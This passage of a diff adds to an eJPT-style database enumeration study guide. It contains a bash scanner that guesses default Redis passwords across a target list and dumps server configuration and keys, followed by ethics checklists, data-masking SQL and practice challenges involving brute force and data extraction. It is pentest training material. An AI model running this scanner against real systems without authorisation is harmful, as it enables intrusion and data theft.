+DBSIZE
+KEYS *
+EOF
+                return 0
+            fi
+        fi
+        
+        # Test common passwords
+        local passwords=("redis" "admin" "password" "123456")
+        for pass in "${passwords[@]}"; do
+            if redis-cli -h "$target" -a "$pass" ping > "/tmp/redis_test.txt" 2>&1; then
+                if grep -q "PONG" "/tmp/redis_test.txt"; then
+                    echo -e "${GREEN}[SUCCESS]${NC} $target:redis:default:$pass"
+                    redis-cli -h "$target" -a "$pass" << EOF > "$OUTPUT_DIR/redis/enum_$target.txt" 2>&1
+INFO
+CONFIG GET "*"
+DBSIZE
+KEYS *
+EOF
+                    return 0
+                fi
+            fi
+        done
+        echo -e "${RED}[-]${NC} Authentication failed for $target:redis"
+    fi
+}
+
+# Main execution
+print_banner
+
+if [[ -z "$TARGET_FILE" ]]; then
+    echo "Usage: $0 <target_file>"
+    echo "Example: $0 targets.txt"
+    exit 1
+fi
+
+if [[ ! -f "$TARGET_FILE" ]]; then
+    echo -e "${RED}[ERROR]${NC} Target file not found: $TARGET_FILE"
+    exit 1
+fi
+
+echo -e "${BLUE}[INFO]${NC} Starting database security scan"
+echo -e "${BLUE}[INFO]${NC} Target file: $TARGET_FILE"
+echo -e "${BLUE}[INFO]${NC} Output directory: $OUTPUT_DIR"
+echo
+
+while read -r target; do
+    if [[ -n "$target" && ! "$target" =~ ^# ]]; then
+        echo -e "${BLUE}[SCANNING]${NC} $target"
+        scan_mysql "$target"
+        scan_postgresql "$target"
+        scan_redis "$target"
+        echo
+    fi
+done < "$TARGET_FILE"
+
+# Generate summary report
+echo -e "${BLUE}[INFO]${NC} Generating summary report"
+cat > "$OUTPUT_DIR/SUMMARY_REPORT.txt" << EOF
+Database Security Assessment Summary
+====================================
+
+Scan Date: $(date)
+Target File: $TARGET_FILE
+Output Directory: $OUTPUT_DIR
+
+Services Discovered:
+$(find "$OUTPUT_DIR" -name "nmap_*.txt" -exec grep -l "open" {} \; | wc -l) total database services found
+
+Successful Authentications:
+$(find "$OUTPUT_DIR" -name "auth_*.txt" -exec grep -l "SUCCESS\|VERSION\|PONG" {} \; | wc -l) successful authentication attempts
+
+Critical Findings:
+- Check individual service directories for detailed results
+- Review authentication logs for successful logins
+- Examine enumeration files for sensitive data discoveries
+
+Recommendations:
+1. Change all default database passwords immediately
+2. Implement network-level access controls
+3. Enable database authentication where missing
+4. Regular security assessments and monitoring
+EOF
+
+echo -e "${GREEN}[COMPLETE]${NC} Scan completed successfully"
+echo -e "${GREEN}[SUMMARY]${NC} Results available in: $OUTPUT_DIR"
 ```
 
-**Issue**: Database queries timing out or hanging
+---
+
+## 🚨 Professional Ethics and Legal Considerations
+
+### **📋 Legal Framework for Database Testing**
+
+#### **Authorization Requirements (Critical)**
+1. **Written Permission:** Explicit, signed authorization before any database testing
+2. **Scope Definition:** Clear boundaries on systems, data types, and testing methods
+3. **Data Handling:** Protocols for sensitive information discovered during testing
+4. **Time Constraints:** Specific testing windows and duration limits
+5. **Emergency Procedures:** Contact protocols for critical vulnerability discoveries
+
+#### **Compliance and Regulatory Considerations**
+```markdown
+## Pre-Assessment Legal Checklist
+
+### Documentation Requirements
+- [ ] Signed Statement of Work (SOW) or penetration testing agreement
+- [ ] Network scope defined in CIDR notation or IP ranges
+- [ ] Database systems explicitly included in testing scope
+- [ ] Data classification and handling requirements documented
+- [ ] Client contact information for emergency situations
+
+### Regulatory Compliance Factors
+- [ ] GDPR compliance for EU data processing
+- [ ] HIPAA requirements for healthcare data
+- [ ] PCI-DSS compliance for payment card data
+- [ ] SOX compliance for financial data
+- [ ] Industry-specific regulations identified and addressed
+
+### Risk Management
+- [ ] Professional liability insurance coverage verified
+- [ ] Testing team background checks completed (if required)
+- [ ] Data breach response procedures established
+- [ ] Evidence handling and chain of custody protocols
+- [ ] Post-assessment data destruction procedures
+```
+
+### **🔐 Ethical Testing Standards**
+
+#### **Data Protection Protocol**
 ```bash
-# Troubleshooting steps:
-1. Set connection timeout
-   mysql -h target -u root -p --connect-timeout=10
-   
-2. Use non-interactive mode
-   mysql -h target -u root -p --batch --execute="SHOW DATABASES;"
-   
-3. Check server load
-   mysql -h target -u root -p -e "SHOW PROCESSLIST;"
+#!/bin/bash
+# Secure Database Testing Environment Setup
+# File: /opt/secure_db_testing_setup.sh
+
+# Create isolated testing environment
+echo "[INFO] Creating isolated testing environment"
+
+# Network isolation setup
+sudo ip netns add db_testing
+sudo ip link add veth0 type veth peer name veth1
+sudo ip link set veth1 netns db_testing
+sudo ip netns exec db_testing ip addr add 10.255.255.1/24 dev veth1
+sudo ip netns exec db_testing ip link set veth1 up
+
+# Secure logging configuration
+SECURE_LOG_DIR="/secure/db_testing/$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$SECURE_LOG_DIR"
+chmod 700 "$SECURE_LOG_DIR"
+
+# Evidence encryption setup
+echo "[INFO] Setting up evidence encryption"
+gpg --gen-key --batch << EOF
+Key-Type: RSA
+Key-Length: 4096
+Subkey-Type: RSA
+Subkey-Length: 4096
+Name-Real: Database Testing Evidence
+Name-Email: security@company.com
+Expire-Date: 1y
+Passphrase: $(openssl rand -base64 32)
+EOF
+
+echo "[INFO] Secure testing environment ready"
+echo "Log Directory: $SECURE_LOG_DIR"
+echo "Network Namespace: db_testing"
 ```
 
-### Performance Optimization
-
-#### Large Database Handling
+#### **Data Minimization and Sampling**
 ```sql
--- For databases with many tables/rows:
--- 1. Use LIMIT clauses
-SELECT * FROM large_table LIMIT 100;
+-- Secure data sampling techniques (MySQL example)
+-- Limit data extraction to proof-of-concept only
 
--- 2. Count before selecting
-SELECT COUNT(*) FROM large_table;
+-- Instead of: SELECT * FROM sensitive_table;
+-- Use limited sampling:
+SELECT 
+    CASE 
+        WHEN ROW_NUMBER() OVER() <= 3 THEN column_name 
+        ELSE '[REDACTED]' 
+    END AS sample_data,
+    COUNT(*) OVER() as total_records
+FROM sensitive_table 
+LIMIT 3;
 
--- 3. Use specific column selection
-SELECT id, username FROM users LIMIT 10;
+-- Data masking for screenshots
+SELECT 
+    CONCAT(LEFT(email, 3), '***@', SUBSTRING_INDEX(email, '@', -1)) as masked_email,
+    CONCAT(LEFT(ssn, 3), '-XX-XXXX') as masked_ssn
+FROM user_data 
+LIMIT 5;
+```
 
---
+---
+
+## 🎯 Final Mastery Assessment and Practical Challenges
+
+### **🏅 Competency Assessment Framework**
+
+#### **Level 1: Foundation Assessment (Score: ___/30)**
+- [ ] **Service Discovery (10 points):** Identify all database services in a network range within 5 minutes
+- [ ] **Authentication Testing (10 points):** Test default credentials across MySQL, PostgreSQL, and Redis
+- [ ] **Basic Enumeration (10 points):** List databases, tables, and basic structure information
+
+#### **Level 2: Intermediate Assessment (Score: ___/40)**
+- [ ] **Advanced Scanning (10 points):** Use Nmap scripts for comprehensive database fingerprinting
+- [ ] **Credential Attacks (10 points):** Conduct systematic brute force attacks with custom wordlists
+- [ ] **Data Analysis (10 points):** Identify and extract sensitive data patterns across multiple databases
+- [ ] **Documentation (10 points):** Produce professional assessment reports with findings and recommendations
+
+#### **Level 3: Expert Assessment (Score: ___/30)**
+- [ ] **Custom Tool Development (10 points):** Create automated database scanning and exploitation scripts
+- [ ] **Integration Workflows (10 points):** Demonstrate seamless integration with other penetration testing tools
+- [ ] **Advanced Exploitation (10 points):** Show database-to-system compromise and privilege escalation techniques
+
+### **🎮 Practical Challenge Scenarios**
+
+#### **Challenge 1: Enterprise Database Assessment**
+```bash
+# Scenario: Corporate network with 50+ database servers
+# Network: 10.0.0.0/16 (large enterprise environment)
+# Objective: Complete security assessment of all database services
+# Time Limit: 4 hours
+# Constraints: Must identify and test at least 15 database instances
+
+# Success Criteria:
+# - Map all database services across the network
+# - Test authentication on each discovered service
+# - Identify and document at least 5 security vulnerabilities
+# - Extract proof-of-concept data from compromised databases
+# - Produce executive-level summary report
+```
+
+#### **Challenge 2: Incident Response Database Forensics**
+```bash
+# Scenario: Suspected database breach investigation
+# Context: Evidence of unauthorized database access detected
+# Objective: Reconstruct attack methodology and assess damage
+# Time Limit: 2 hours
+# Constraints: Must preserve forensic integrity
+
+# Success Criteria:
+# - Identify attack vectors used by threat actors
+# - Determine scope of data accessed or exfiltrated
+# - Collect forensic evidence for legal proceedings
+# - Develop indicators of compromise (IOCs)
+# - Create incident response recommendations
+```
+
+#### **Challenge 3: Compliance Assessment Simulation**
+```bash
+# Scenario: PCI-DSS compliance database security testing
+# Context: E-commerce platform database security validation
+# Objective: Validate database security controls and compliance
+# Time Limit: 3 hours
+# Constraints: Must follow PCI-DSS testing requirements
+
+# Success Criteria:
+# - Test all database security requirements per PCI-DSS
+# - Document compliance gaps and violations
+# - Assess cardholder data protection measures
+# - Validate access controls and monitoring systems
+# - Produce compliance assessment report
+```
+
+### **🏆 Certification Readiness Verification**
+
+#### **eJPT Database Readiness Self-Test (Pass Score: 85%)**
+1. **Complete database service enumeration on target network range**
+2. **Demonstrate successful authentication against 3 different database types**
+3. **Extract and document sensitive data findings with proper evidence**
+4. **Show integration between Nmap scanning and database client tools**
+5. **Produce professional findings report within time constraints**
+6. **Troubleshoot and resolve common connection and authentication issues**
+
+#### **Professional Competency Standards**
+```markdown
+## Technical Proficiency Verification
+- [ ] Can conduct comprehensive database security assessment independently
+- [ ] Demonstrates advanced troubleshooting and problem resolution skills
+- [ ] Shows expertise across multiple database platforms and technologies
+- [ ] Capable of developing custom tools and automation scripts
+- [ ] Contributes to security community through research and knowledge sharing
+
+## Professional Application Standards
+- [ ] Understands legal and regulatory requirements for database testing
+- [ ] Communicates technical findings effectively to various stakeholder levels
+- [ ] Produces industry-standard reports and documentation
+- [ ] Maintains current knowledge of database security threats and trends
+- [ ] Demonstrates ethical testing practices and data protection standards
+```
+
+---
+
+## 🎊 Conclusion and Professional Development Path
+
+This comprehensive database enumeration guide provides the foundation for professional database security assessment. You now possess the knowledge and practical skills to identify, assess, and document database security vulnerabilities effectively.
+
+### **🚀 Your Continued Learning Journey**
+
+#### **Immediate Action Items:**
+1. **Practice Daily:** Complete at least one database enumeration exercise daily
+2. **Build Lab Environment:** Set up personal vulnerable database instances for testing
+3. **Tool Mastery:** Achieve fluency with all major database clients and security tools
+4. **Documentation Skills:** Practice creating professional security assessment reports
+
+#### **Advanced Development Path:**
+1. **Specialized Certifications:** Pursue database-specific security certifications
+2. **Research Contribution:** Participate in vulnerability research and disclosure
+3. **Community Engagement:** Join professional database security communities
+4. **Mentorship:** Share knowledge through teaching and training others
+
+#### **Career Progression Opportunities:**
+- **Database Security Specialist:** Focus on enterprise database protection
+- **Penetration Testing Consultant:** Integrate database testing into comprehensive assessments
+- **Compliance Auditor:** Specialize in regulatory database security requirements
+- **Security Researcher:** Develop new database security testing methodologies
+
+### **📚 Continuous Learning Resources**
+
+#### **Essential Reading:**
+- "Database Security" by Alfred Basta and Melissa Zgola
+- "SQL Injection Attacks and Defense" by Justin Clarke
+- "PostgreSQL Security" by Hans-Jürgen Schönig
+- "Redis Security Handbook" by Redis Labs
+
+#### **Professional Training:**
+- SANS SEC542: Web App Penetration Testing and Ethical Hacking
+- SANS SEC560: Network Penetration Testing and Ethical Hacking
+- Offensive Security Advanced Web Attacks and Exploitation (AWAE)
+- eLearnSecurity Web Application Penetration Tester eXtreme (eWPTX)
+
+**Remember:** Database security is an evolving field. Stay curious, practice ethically, and always prioritize the protection of sensitive data and systems.
+
+*Secure Database Assessment Success! 🎯*
+
+---
+
+**Document Version:** 3.0  
+**Last Updated:** 2024-01-15  
+**Next Review:** 2024-04-15  
+**Maintainer:** eJPT Study Guide Team
